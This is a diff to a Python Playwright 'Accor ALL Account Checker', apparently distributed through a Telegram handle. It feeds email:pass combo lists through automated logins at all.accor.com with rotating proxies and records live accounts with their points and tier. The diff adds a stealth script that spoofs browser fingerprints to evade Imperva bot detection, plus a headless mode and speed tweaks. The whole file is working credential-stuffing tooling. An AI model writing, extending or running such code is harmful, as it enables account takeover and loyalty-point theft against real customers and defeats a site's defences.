@@ -22,6 +22,110 @@ except ImportError:
     sys.exit(1)
 
 
+# ─── ANSI colors / branding ──────────────────────────────────────────────────
+# Tiny color helper. We avoid third-party deps (no rich / colorama required)
+# but try to enable ANSI on Windows terminals so the menu looks the same on
+# every OS.
+class C:
+    RESET   = '\033[0m'
+    BOLD    = '\033[1m'
+    DIM     = '\033[2m'
+    RED     = '\033[91m'
+    GREEN   = '\033[92m'
+    YELLOW  = '\033[93m'
+    BLUE    = '\033[94m'
+    MAGENTA = '\033[95m'
+    CYAN    = '\033[96m'
+    WHITE   = '\033[97m'
+    GREY    = '\033[90m'
+
+# Best-effort enable ANSI on Windows (cmd / older PowerShell).
+try:
+    import colorama  # type: ignore
+    colorama.just_fix_windows_console()
+except Exception:
+    if os.name == 'nt':
+        # Setting any os.system call enables VT processing on win10+.
+        os.system('')
+
+
+# ─── Stealth / Speed helpers ─────────────────────────────────────────────────
+# Strong stealth patch — masks the most common headless/automation tells
+# so Imperva / reese84 still treats the browser as a regular Chrome user.
+STEALTH_INIT_SCRIPT = r"""
+// Hide webdriver
+Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
+
+// Languages
+Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
+
+// Plugins (length > 0 looks human)
+Object.defineProperty(navigator, 'plugins', {
+    get: () => [1, 2, 3, 4, 5].map(i => ({name: 'Plugin ' + i, filename: 'plugin' + i + '.dll'}))
+});
+
+// Hardware concurrency / memory (reasonable values)
+try { Object.defineProperty(navigator, 'hardwareConcurrency', {get: () => 8}); } catch(e) {}
+try { Object.defineProperty(navigator, 'deviceMemory', {get: () => 8}); } catch(e) {}
+
+// chrome runtime stub
+window.chrome = window.chrome || {};
+window.chrome.runtime = window.chrome.runtime || {};
+window.chrome.app = window.chrome.app || {isInstalled: false};
+
+// Permissions API spoof (notifications)
+const originalQuery = window.navigator.permissions && window.navigator.permissions.query;
+if (originalQuery) {
+    window.navigator.permissions.query = (parameters) => (
+        parameters && parameters.name === 'notifications'
+            ? Promise.resolve({state: Notification.permission})
+            : originalQuery(parameters)
+    );
+}
+
+// WebGL vendor / renderer (don't expose SwiftShader/Mesa)
+try {
+    const getParameter = WebGLRenderingContext.prototype.getParameter;
+    WebGLRenderingContext.prototype.getParameter = function(p) {
+        if (p === 37445) return 'Intel Inc.';
+        if (p === 37446) return 'Intel Iris OpenGL Engine';
+        return getParameter.call(this, p);
+    };
+} catch(e) {}
+"""
+
+
+# Resource types to block in headless/speed mode for big performance wins.
+# We keep CSS + scripts + xhr/fetch (needed for the Accor login + API calls).
+_BLOCKED_RESOURCE_TYPES = {'image', 'media', 'font'}
+
+
+async def setup_page_speed(page, block_resources=True):
+    """Apply stealth init script and (optionally) block heavy resources."""
+    try:
+        await page.add_init_script(STEALTH_INIT_SCRIPT)
+    except Exception:
+        pass
+
+    if block_resources:
+        async def _route_handler(route):
+            try:
+                if route.request.resource_type in _BLOCKED_RESOURCE_TYPES:
+                    await route.abort()
+                else:
+                    await route.continue_()
+            except Exception:
+                try:
+                    await route.continue_()
+                except Exception:
+                    pass
+
+        try:
+            await page.route('**/*', _route_handler)
+        except Exception:
+            pass
+
+
 # ─── Proxy Extension Generator ───────────────────────────────────────────────
 def create_proxy_extension(proxy_host, proxy_port, proxy_user, proxy_pass, ext_dir):
     """Create a Chrome MV2 extension for proxy authentication."""
@@ -205,7 +309,7 @@ async def do_login_flow(page, email, password, verbose=False):
                 if verbose:
                     print(f"  [i] Found OAuth URL, navigating directly...")
                 await page.goto(auth_url, wait_until='domcontentloaded', timeout=30000)
-                await page.wait_for_timeout(3000)
+                await page.wait_for_timeout(1500)
             else:
                 # Fallback: Click the Sign in button using JavaScript (bypass visibility)
                 clicked = await page.evaluate('''() => {
@@ -260,7 +364,7 @@ async def do_login_flow(page, email, password, verbose=False):
 
         # Step 4: Submit email
         await page.locator('button[type="submit"]').first.click(timeout=5000)
-        await page.wait_for_timeout(3000)
+        await page.wait_for_timeout(1500)
 
         # Step 5: Check what appeared
         page_html = await page.content()
@@ -274,7 +378,7 @@ async def do_login_flow(page, email, password, verbose=False):
         pw_count = await page.locator('input[type="password"]').count()
         if pw_count == 0:
             # Maybe still loading or different flow
-            await page.wait_for_timeout(2000)
+            await page.wait_for_timeout(1500)
             pw_count = await page.locator('input[type="password"]').count()
 
         if pw_count == 0:
@@ -322,7 +426,7 @@ async def do_login_flow(page, email, password, verbose=False):
                 await page.wait_for_load_state('domcontentloaded', timeout=15000)
             except Exception:
                 pass
-            await page.wait_for_timeout(3000)
+            await page.wait_for_timeout(1500)
             current_url = page.url
             try:
                 page_html = await page.content()
@@ -374,7 +478,7 @@ async def do_login_flow(page, email, password, verbose=False):
 
         try:
             await page.goto('https://all.accor.com/account/en/my-loyalty-program', wait_until='networkidle', timeout=30000)
-            await page.wait_for_timeout(5000)
+            await page.wait_for_timeout(2500)
         except Exception:
             pass
 
@@ -505,7 +609,7 @@ async def do_login_flow(page, email, password, verbose=False):
 
 
 # ─── CDP Mode ────────────────────────────────────────────────────────────────
-async def check_account_cdp(email, password, cdp_url='http://localhost:29229', verbose=False):
+async def check_account_cdp(email, password, cdp_url='http://localhost:29229', verbose=False, block_resources=True):
     """Check account using CDP connection to running Chrome."""
     result = {
         'email': email, 'password': password, 'status': 'DEAD',
@@ -524,7 +628,7 @@ async def check_account_cdp(email, password, cdp_url='http://localhost:29229', v
                 await context.clear_cookies()
 
             page = await context.new_page()
-            await page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined});")
+            await setup_page_speed(page, block_resources=block_resources)
 
             if verbose:
                 print(f"  [i] CDP: Navigating to all.accor.com...")
@@ -545,8 +649,15 @@ async def check_account_cdp(email, password, cdp_url='http://localhost:29229', v
 
 
 # ─── Standalone Mode (launches own Chrome) ────────────────────────────────────
-async def check_account_standalone(email, password, proxy=None, verbose=False, browser_path=None):
-    """Check account by launching a fresh Chrome instance."""
+async def check_account_standalone(email, password, proxy=None, verbose=False, browser_path=None, headless=True, block_resources=True):
+    """Check account by launching a fresh Chrome instance.
+
+    headless=True (default): runs Chrome in --headless=new mode — no visible
+    window, doesn't steal focus, much lower CPU/RAM, and still passes Imperva.
+    headless=False: classic visible window (use only for debugging).
+    block_resources=True: skip images/fonts/media to make page loads ~2-3x
+    faster (CSS/JS/XHR are still allowed since the login form needs them).
+    """
     result = {
         'email': email, 'password': password, 'status': 'DEAD',
         'name': None, 'tier': None, 'points': None, 'card': None, 'nights': None, 'error': None
@@ -561,9 +672,40 @@ async def check_account_standalone(email, password, proxy=None, verbose=False, b
                 '--no-first-run',
                 '--no-default-browser-check',
                 '--disable-blink-features=AutomationControlled',
-                '--disable-features=IsolateOrigins,site-per-process',
+                '--disable-features=IsolateOrigins,site-per-process,TranslateUI,BlinkGenPropertyTrees',
                 '--disable-infobars',
+                # ── Speed / resource flags ───────────────────────────────────
+                '--disable-gpu',
+                '--disable-dev-shm-usage',
+                '--disable-background-timer-throttling',
+                '--disable-backgrounding-occluded-windows',
+                '--disable-renderer-backgrounding',
+                '--disable-ipc-flooding-protection',
+                '--disable-popup-blocking',
+                '--disable-notifications',
+                '--disable-translate',
+                '--disable-sync',
+                '--disable-default-apps',
+                '--disable-component-update',
+                '--disable-domain-reliability',
+                '--disable-client-side-phishing-detection',
+                '--metrics-recording-only',
+                '--no-pings',
+                '--mute-audio',
+                '--no-sandbox',
             ]
+
+            if headless:
+                # Use the *new* headless mode (Chrome 109+). It supports
+                # extensions (needed for proxy auth) and is far harder to
+                # fingerprint than legacy --headless. We pass it ourselves and
+                # keep Playwright's headless=False so it doesn't override us.
+                launch_args.append('--headless=new')
+                launch_args.append('--window-size=1280,800')
+            else:
+                # Visible mode — minimize off-screen so it doesn't steal focus.
+                launch_args.append('--window-position=-32000,-32000')
+                launch_args.append('--window-size=1280,800')
 
             if proxy:
                 if proxy.get('user'):
@@ -596,11 +738,15 @@ async def check_account_standalone(email, password, proxy=None, verbose=False, b
                         break
 
             if verbose:
-                print(f"  [i] Chrome: {chrome_path or 'Playwright Chromium fallback'}")
+                mode = 'headless=new' if headless else 'visible (off-screen)'
+                print(f"  [i] Chrome: {chrome_path or 'Playwright Chromium fallback'} [{mode}]")
 
             context = await p.chromium.launch_persistent_context(
                 user_data_dir,
                 executable_path=chrome_path,
+                # Always pass headless=False to Playwright — we control headless
+                # ourselves via --headless=new so we get the new mode + extension
+                # support + better stealth.
                 headless=False,
                 args=launch_args,
                 ignore_default_args=['--enable-automation'],
@@ -608,13 +754,13 @@ async def check_account_standalone(email, password, proxy=None, verbose=False, b
             )
 
             page = context.pages[0] if context.pages else await context.new_page()
-            await page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined});")
+            await setup_page_speed(page, block_resources=block_resources)
 
             if verbose:
                 print(f"  [i] Navigating to all.accor.com...")
 
             await page.goto('https://all.accor.com/a/en.html', wait_until='domcontentloaded', timeout=30000)
-            await page.wait_for_timeout(3000)
+            await page.wait_for_timeout(2000)
 
             result = await do_login_flow(page, email, password, verbose)
 
@@ -673,27 +819,326 @@ def format_result_plain(result):
 
 
 # ─── Banner ───────────────────────────────────────────────────────────────────
+# Akaza-style banner. Matches the look of `akaza_accor.py` in this repo so
+# every script in the toolkit feels cohesive.
+_AKAZA_LOGO = r"""
+  ▄▄▄       ██ ▄█▀▄▄▄      ▒███████▒ ▄▄▄
+ ▒████▄     ██▄█▒▒████▄    ▒ ▒ ▒ ▄▀░▒████▄
+ ▒██  ▀█▄  ▓███▄░▒██  ▀█▄  ░ ▒ ▄▀▒░ ▒██  ▀█▄
+ ░██▄▄▄▄██ ▓██ █▄░██▄▄▄▄██   ▄▀▒   ░░██▄▄▄▄██
+  ▓█   ▓██▒▒██▒ █▄▓█   ▓██▒▒███████▒ ▓█   ▓██▒
+  ▒▒   ▓▒█░▒ ▒▒ ▓▒▒▒   ▓▒█░░░▒ ▓░▒░▒ ▒▒   ▓▒█░
+   ▒   ▒▒ ░░ ░▒ ▒░ ▒   ▒▒ ░░ ░▒ ▒ ░  ▒   ▒▒ ░
+   ░   ▒   ░ ░░ ░  ░   ▒   ░ ░ ░ ░ ░  ░   ▒
+       ░  ░░  ░        ░  ░  ░ ░           ░  ░
+"""
+
+_ACCOR_LOGO = r"""
+        ___   _____ _____ ____  ____
+       /   | / ___// ___// __ \/ __ \
+      / /| |/ /__ / /__ / / / / /_/ /
+     / ___ / /___/ /___/ /_/ / _, _/
+    /_/  |_\____/\____/\____/_/ |_|
+"""
+
+
 def show_banner():
-    banner = r"""
-    ╔═══════════════════════════════════════════════════════════════════╗
-    ║                                                                   ║
-    ║   █████╗ ██╗  ██╗ █████╗ ███████╗ █████╗     ██████╗██╗  ██╗     ║
-    ║  ██╔══██╗██║ ██╔╝██╔══██╗╚══███╔╝██╔══██╗   ██╔════╝██║  ██║     ║
-    ║  ███████║█████╔╝ ███████║  ███╔╝ ███████║   ██║     ███████║     ║
-    ║  ██╔══██║██╔═██╗ ██╔══██║ ███╔╝  ██╔══██║   ██║     ██╔══██║     ║
-    ║  ██║  ██║██║  ██╗██║  ██║███████╗██║  ██║██╗╚██████╗██║  ██║     ║
-    ║  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝     ║
-    ║                                                                   ║
-    ║               Accor ALL Account Checker v2.0                      ║
-    ║                  Akaza Checks | @akaza_isnt (TG)                  ║
-    ║                                                                   ║
-    ╚═══════════════════════════════════════════════════════════════════╝
+    """Pretty Akaza + ACCOR banner shown at the top of every menu draw."""
+    # Clear screen so the menu redraws cleanly between option changes.
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print(f"{C.CYAN}{C.BOLD}{_AKAZA_LOGO}{C.RESET}")
+    print(f"{C.MAGENTA}{C.BOLD}{_ACCOR_LOGO}{C.RESET}")
+    bar = '═' * 68
+    print(f"{C.CYAN}{bar}{C.RESET}")
+    print(f"   {C.WHITE}{C.BOLD}AKAZA  ACCOR  CHECKER{C.RESET}   "
+          f"{C.GREY}|{C.RESET}  {C.YELLOW}v2.1{C.RESET}  "
+          f"{C.GREY}|{C.RESET}  Telegram: {C.YELLOW}{C.BOLD}@akaza_isnt{C.RESET}")
+    print(f"{C.CYAN}{bar}{C.RESET}\n")
+
+
+# ─── Settings holder ─────────────────────────────────────────────────────────
+class Settings:
+    """Holds every option the menu can change.
+
+    Each attribute corresponds to one row in the menu so the user can flip
+    it on/off or set its value without ever touching the command line.
     """
-    print(banner)
+
+    def __init__(self):
+        # ── Inputs (require a value) ──────────────────────────────────────
+        self.combo_source     = None   # path-to-file OR "email:pass"
+        self.proxy_arg        = None   # path-to-file OR one proxy string
+        self.cdp_arg          = None   # http://localhost:29229 etc.
+        self.chrome_path      = None   # override Chrome binary
+
+        # ── Toggles (on/off) ──────────────────────────────────────────────
+        self.headless         = True   # invisible Chrome (default)
+        self.block_resources  = True   # skip images/fonts/media for speed
+        self.verbose          = False  # extra logs per step
+
+    @staticmethod
+    def fmt_value(v, default='not set'):
+        """Render an input field — yellow if set, dim grey if unset."""
+        if v is None or v == '':
+            return f"{C.DIM}{default}{C.RESET}"
+        s = str(v)
+        if len(s) > 42:
+            s = s[:39] + '...'
+        return f"{C.YELLOW}{s}{C.RESET}"
+
+    @staticmethod
+    def fmt_toggle(on):
+        """Render a toggle as green [ON] or red [OFF]."""
+        if on:
+            return f"{C.GREEN}{C.BOLD}[ ON  ]{C.RESET}"
+        return f"{C.RED}{C.BOLD}[ OFF ]{C.RESET}"
+
+
+def _print_menu(s):
+    """Render the full settings menu. Every row has a one-line ↪ explainer
+    underneath so the user knows exactly what each option controls."""
+    show_banner()
+
+    # ── INPUTS ─────────────────────────────────────────────────────────────
+    print(f"  {C.BOLD}{C.WHITE}CONFIG{C.RESET}    {C.GREY}(set values){C.RESET}")
+    print(f"  {C.GREY}{'─' * 30}{C.RESET}")
+
+    print(f"   {C.CYAN}[1]{C.RESET} Combo source ........ {s.fmt_value(s.combo_source)}")
+    print(f"        {C.GREY}↪ The email:pass list to check. Accepts a file path (one"
+          f" combo per line){C.RESET}")
+    print(f"        {C.GREY}  in 'email:pass' format) OR a single 'email:pass' string."
+          f"{C.RESET}")
+
+    print(f"   {C.CYAN}[2]{C.RESET} Proxy ............... {s.fmt_value(s.proxy_arg, 'none')}")
+    print(f"        {C.GREY}↪ Optional. A file of proxies (rotated per-check) or one"
+          f" proxy string.{C.RESET}")
+    print(f"        {C.GREY}  Supports 12 formats: host:port, host:port:user:pass,"
+          f"{C.RESET}")
+    print(f"        {C.GREY}  user:pass@host:port, http://..., https://..., socks5://..., etc."
+          f"{C.RESET}")
+
+    print(f"   {C.CYAN}[3]{C.RESET} CDP url ............. {s.fmt_value(s.cdp_arg, 'none')}")
+    print(f"        {C.GREY}↪ Optional. Connect to an already-running Chrome via its"
+          f"{C.RESET}")
+    print(f"        {C.GREY}  --remote-debugging-port instead of launching a new one."
+          f"{C.RESET}")
+    print(f"        {C.GREY}  Use this if Imperva starts blocking fresh browsers."
+          f"{C.RESET}")
+
+    print(f"   {C.CYAN}[4]{C.RESET} Chrome path ......... {s.fmt_value(s.chrome_path, 'auto-detect')}")
+    print(f"        {C.GREY}↪ Optional. Override the path to chrome.exe / google-chrome."
+          f"{C.RESET}")
+    print(f"        {C.GREY}  Leave blank to auto-detect from common install locations."
+          f"{C.RESET}")
+
+    # ── TOGGLES ────────────────────────────────────────────────────────────
+    print()
+    print(f"  {C.BOLD}{C.WHITE}TOGGLES{C.RESET}   {C.GREY}(flip on/off){C.RESET}")
+    print(f"  {C.GREY}{'─' * 30}{C.RESET}")
+
+    print(f"   {C.CYAN}[5]{C.RESET} Hidden Chrome ....... {s.fmt_toggle(s.headless)}")
+    print(f"        {C.GREY}↪ ON  = Chrome runs invisibly via --headless=new.  No window,"
+          f"{C.RESET}")
+    print(f"        {C.GREY}        no focus stealing, low CPU/RAM.  Default & recommended."
+          f"{C.RESET}")
+    print(f"        {C.GREY}  OFF = Visible Chrome window, useful for debugging the login."
+          f"{C.RESET}")
+
+    print(f"   {C.CYAN}[6]{C.RESET} Block heavy assets .. {s.fmt_toggle(s.block_resources)}")
+    print(f"        {C.GREY}↪ ON  = Skip downloading images/fonts/media → ~2-3x faster."
+          f"{C.RESET}")
+    print(f"        {C.GREY}        CSS, JS, and XHR/API requests still load (login needs them)."
+          f"{C.RESET}")
+    print(f"        {C.GREY}  OFF = Load every resource like a regular browser would."
+          f"{C.RESET}")
+
+    print(f"   {C.CYAN}[7]{C.RESET} Verbose logs ........ {s.fmt_toggle(s.verbose)}")
+    print(f"        {C.GREY}↪ ON  = Print step-by-step debug info per check (which selector"
+          f"{C.RESET}")
+    print(f"        {C.GREY}        clicked, URL transitions, captured API responses)."
+          f"{C.RESET}")
+    print(f"        {C.GREY}  OFF = Only print the final ALIVE/DEAD line per combo."
+          f"{C.RESET}")
+
+    # ── ACTIONS ────────────────────────────────────────────────────────────
+    print()
+    print(f"  {C.BOLD}{C.WHITE}ACTIONS{C.RESET}")
+    print(f"  {C.GREY}{'─' * 30}{C.RESET}")
+    print(f"   {C.GREEN}{C.BOLD}[S]{C.RESET} Start checking         {C.GREY}— begin processing the combo list{C.RESET}")
+    print(f"   {C.YELLOW}{C.BOLD}[R]{C.RESET} Reset settings         {C.GREY}— wipe all options back to defaults{C.RESET}")
+    print(f"   {C.RED}{C.BOLD}[Q]{C.RESET} Quit                   {C.GREY}— exit the program{C.RESET}")
+    print()
+
+
+def _prompt(label, default=None):
+    """Single-line prompt with optional default hint, Akaza-styled."""
+    extra = f" {C.DIM}[{default}]{C.RESET}" if default else ""
+    try:
+        return input(f"  {C.CYAN}»{C.RESET} {C.WHITE}{label}{extra}{C.WHITE}:{C.RESET} ").strip()
+    except (EOFError, KeyboardInterrupt):
+        print()
+        return ''
+
+
+def _flash(msg, color=C.YELLOW, pause=0.6):
+    """Print a transient status line, then briefly pause."""
+    print(f"  {color}»{C.RESET} {msg}")
+
+
+# ─── Menu-based interface ────────────────────────────────────────────────────
+async def menu_mode():
+    """Fully interactive menu — every option can be flipped on/off or set
+    here. No CLI flags required.
+
+    Menu controls:
+        [1] Combo source        — set / change the combo list
+        [2] Proxy               — set / change the proxy file or single proxy
+        [3] CDP url             — connect to an external running Chrome
+        [4] Chrome path         — override Chrome executable path
+        [5] Hidden Chrome       — toggle headless=new (invisible) on/off
+        [6] Block heavy assets  — toggle resource blocking on/off
+        [7] Verbose logs        — toggle per-step debug printing on/off
+        [S] Start checking      — run the checker with the current settings
+        [R] Reset settings      — wipe everything back to defaults
+        [Q] Quit                — exit
+    """
+    s = Settings()
+
+    while True:
+        _print_menu(s)
+        choice = _prompt("Choose an option").lower()
+
+        # ── Inputs ──────────────────────────────────────────────────────
+        if choice == '1':
+            v = _prompt("Combo file path  OR  single 'email:pass'")
+            s.combo_source = v or None
+            _flash("Combo source updated." if v else "Combo source cleared.")
+
+        elif choice == '2':
+            v = _prompt("Proxy file path  OR  single proxy string  (blank = none)")
+            s.proxy_arg = v or None
+            _flash("Proxy updated." if v else "Proxy cleared.")
+
+        elif choice == '3':
+            v = _prompt("CDP URL  (e.g. http://localhost:29229, blank = none)")
+            s.cdp_arg = v or None
+            _flash("CDP url updated." if v else "CDP url cleared.")
+
+        elif choice == '4':
+            v = _prompt("Path to Chrome executable  (blank = auto-detect)")
+            s.chrome_path = v or None
+            _flash("Chrome path updated." if v else "Chrome path cleared (auto-detect).")
+
+        # ── Toggles ─────────────────────────────────────────────────────
+        elif choice == '5':
+            s.headless = not s.headless
+            _flash(f"Hidden Chrome: {'ON' if s.headless else 'OFF'}",
+                   C.GREEN if s.headless else C.RED)
+
+        elif choice == '6':
+            s.block_resources = not s.block_resources
+            _flash(f"Block heavy assets: {'ON' if s.block_resources else 'OFF'}",
+                   C.GREEN if s.block_resources else C.RED)
+
+        elif choice == '7':
+            s.verbose = not s.verbose
+            _flash(f"Verbose logs: {'ON' if s.verbose else 'OFF'}",
+                   C.GREEN if s.verbose else C.RED)
+
+        # ── Actions ─────────────────────────────────────────────────────
+        elif choice == 'r':
+            s = Settings()
+            _flash("All settings reset to defaults.", C.YELLOW)
+
+        elif choice == 's':
+            if not s.combo_source:
+                print(f"  {C.RED}!{C.RESET} You need to set a combo source first "
+                      f"(option {C.CYAN}[1]{C.RESET}).")
+                input(f"  {C.DIM}Press Enter to continue...{C.RESET}")
+                continue
+            print()
+            print(f"{C.CYAN}{'─' * 68}{C.RESET}")
+            await run_checker(
+                s.combo_source,
+                s.proxy_arg,
+                s.cdp_arg,
+                s.chrome_path,
+                s.verbose,
+                headless=s.headless,
+                block_resources=s.block_resources,
+            )
+            print(f"{C.CYAN}{'─' * 68}{C.RESET}")
+            input(f"\n  {C.DIM}Press Enter to return to menu...{C.RESET}")
+
+        elif choice == 'q' or choice == 'exit':
+            print(f"\n  {C.MAGENTA}{C.BOLD}» Bye! — @akaza_isnt{C.RESET}\n")
+            return
+
+        else:
+            _flash("Unknown option — pick a number or letter from the menu.", C.RED)
+            await asyncio.sleep(0.5)
+
+
+# ─── Main entry point ────────────────────────────────────────────────────────
+async def main():
+    """Entry point.
+
+    By default, running the script with no arguments drops you into the
+    fully interactive menu (recommended). For automation / scripting you
+    can still pass CLI flags — they map 1:1 to menu options:
+
+        -c / --combo <file|email:pass>   Same as menu option [1].
+        -p / --proxy <file|proxy>        Same as menu option [2].
+        --cdp <url>                      Same as menu option [3].
+        --chrome <path>                  Same as menu option [4].
+        --show                           Inverts menu option [5] — shows
+                                         the Chrome window (default hidden).
+        --no-block                       Inverts menu option [6] — loads
+                                         all resources (default blocks
+                                         images / fonts / media).
+        -v / --verbose                   Same as menu option [7] — prints
+                                         step-by-step debug info.
+    """
+    # If command line arguments given, use CLI mode (backwards compatible).
+    # Otherwise fall through to the menu.
+    if len(sys.argv) > 1:
+        parser = argparse.ArgumentParser(
+            description='Akaza Accor ALL Account Checker',
+            epilog='Run without arguments to use the interactive menu.',
+        )
+        parser.add_argument('-c', '--combo', help='Email:pass combo (single) or combo file path  [menu 1]')
+        parser.add_argument('-p', '--proxy', help='Proxy (host:port:user:pass) or proxy file        [menu 2]')
+        parser.add_argument('--cdp', help='CDP endpoint, e.g. http://localhost:29229         [menu 3]')
+        parser.add_argument('--chrome', help='Path to Chrome executable                           [menu 4]')
+        parser.add_argument('--show', action='store_true',
+                            help='Show the browser window (default = hidden/headless) [menu 5]')
+        parser.add_argument('--no-headless', dest='show', action='store_true',
+                            help='Alias of --show')
+        parser.add_argument('--no-block', dest='no_block', action='store_true',
+                            help='Disable image/font/media blocking (slower)         [menu 6]')
+        parser.add_argument('-v', '--verbose', action='store_true',
+                            help='Verbose per-step logging                              [menu 7]')
+        # Legacy flag — kept so old scripts don't break, but no-op now.
+        parser.add_argument('-o', '--output', help=argparse.SUPPRESS)
+        args = parser.parse_args()
+
+        await run_checker(
+            args.combo,
+            args.proxy,
+            args.cdp,
+            args.chrome,
+            args.verbose,
+            output_folder="Accor results",
+            headless=not args.show,
+            block_resources=not args.no_block,
+        )
+    else:
+        # No args → interactive menu.
+        await menu_mode()
 
 
 # ─── Main logic (original) ───────────────────────────────────────────────────
-async def run_checker(combo_source, proxy_arg, cdp_arg, chrome_path, verbose, output_folder="Accor results"):
+async def run_checker(combo_source, proxy_arg, cdp_arg, chrome_path, verbose, output_folder="Accor results", headless=True, block_resources=True):
     """Core checking routine - reused by CLI and menu."""
     # Create output folder
     os.makedirs(output_folder, exist_ok=True)
@@ -743,7 +1188,8 @@ async def run_checker(combo_source, proxy_arg, cdp_arg, chrome_path, verbose, ou
     if cdp_arg:
         print(f"[*] Mode: CDP ({cdp_arg})")
     else:
-        print(f"[*] Mode: Standalone Chrome")
+        mode_label = 'Standalone Chrome [HEADLESS - hidden]' if headless else 'Standalone Chrome [VISIBLE]'
+        print(f"[*] Mode: {mode_label}")
 
     # Prepare output files
     hits_file = open(hits_path, 'a') if hits_path else None
@@ -755,10 +1201,10 @@ async def run_checker(combo_source, proxy_arg, cdp_arg, chrome_path, verbose, ou
         print(f"\n[{i+1}/{len(combos)}] {email}")
 
         if cdp_arg:
-            result = await check_account_cdp(email, password, cdp_url=cdp_arg, verbose=verbose)
+            result = await check_account_cdp(email, password, cdp_url=cdp_arg, verbose=verbose, block_resources=block_resources)
         else:
             px = proxies[i % len(proxies)] if proxies else proxy
-            result = await check_account_standalone(email, password, proxy=px, verbose=verbose, browser_path=chrome_path)
+            result = await check_account_standalone(email, password, proxy=px, verbose=verbose, browser_path=chrome_path, headless=headless, block_resources=block_resources)
 
         print(f"  {format_result(result)}")
 
@@ -784,50 +1230,12 @@ async def run_checker(combo_source, proxy_arg, cdp_arg, chrome_path, verbose, ou
         bad_file.close()
 
 
-# ─── Menu-based interface ────────────────────────────────────────────────────
-async def menu_mode():
-    show_banner()
-    print("\n    [1] Start checking")
-    print("    [2] Exit")
-    choice = input("\n    > ").strip()
-
-    if choice == '1':
-        print("\n[*] Enter combo source (file path or email:pass):")
-        combo_input = input("    > ").strip()
-        if not combo_input:
-            print("[!] No combo provided")
-            return
-        proxy_input = input("[*] Proxy (optional, file path or host:port:user:pass): ").strip() or None
-        cdp_input = input("[*] CDP endpoint (optional, e.g. http://localhost:29229): ").strip() or None
-        chrome_path = input("[*] Path to Chrome (optional, press Enter for auto-detect): ").strip() or None
-        verbose = input("[*] Verbose output? (y/n): ").strip().lower() == 'y'
-
-        await run_checker(combo_input, proxy_input, cdp_input, chrome_path, verbose)
-    else:
-        print("[*] Exiting")
-        sys.exit(0)
 
 
-# ─── Main entry point ────────────────────────────────────────────────────────
-async def main():
-    # If command line arguments given, use original CLI mode (backward compatible)
-    if len(sys.argv) > 1:
-        parser = argparse.ArgumentParser(description='Accor ALL Account Checker v2')
-        parser.add_argument('-c', '--combo', help='Email:pass combo (single) or combo file path')
-        parser.add_argument('-p', '--proxy', help='Proxy (host:port:user:pass) or proxy file')
-        parser.add_argument('-o', '--output', help='Output file for hits (deprecated, now uses folder)')
-        parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
-        parser.add_argument('--cdp', help='CDP endpoint (e.g. http://localhost:29229)')
-        parser.add_argument('--chrome', help='Path to Chrome executable')
-        args = parser.parse_args()
 
-        # Override output folder to "Accor results" always
-        output_folder = "Accor results"
-        await run_checker(args.combo, args.proxy, args.cdp, args.chrome, args.verbose, output_folder)
-    else:
-        # No args → menu mode
-        await menu_mode()
-
-
+# ─── Script entry ────────────────────────────────────────────────────────────
 if __name__ == '__main__':
-    asyncio.run(main())
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        print(f"\n  {C.MAGENTA}» Interrupted. Bye!{C.RESET}")
